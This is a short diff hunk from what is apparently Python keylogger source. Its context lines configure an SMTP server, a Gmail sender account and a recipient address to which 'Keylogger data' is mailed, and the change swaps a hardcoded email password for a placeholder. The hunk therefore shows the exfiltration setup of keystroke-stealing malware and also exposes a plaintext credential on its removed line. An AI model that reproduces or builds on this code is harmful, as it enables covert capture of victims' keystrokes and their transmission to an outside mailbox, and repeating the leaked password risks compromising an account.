@@ -110,7 +110,7 @@ class TimerClass(threading.Thread):
                 SERVER = "smtp.gmail.com"  # Specify Server Here
                 PORT = 587  # Specify Port Here
                 USER = "thwyreddit777@gmail.com"  # Specify Username Here
-                PASS = "GoogleChrome1"  # Specify Password Here
+                PASS = "password"  # Specify Password Here
                 FROM = USER  # From address is taken from username
                 TO = ["ammplogger@dinois.fun"]  # Specify to address.Use comma if more than one to address is needed.
                 SUBJECT = "Keylogger data: " + str(ts)
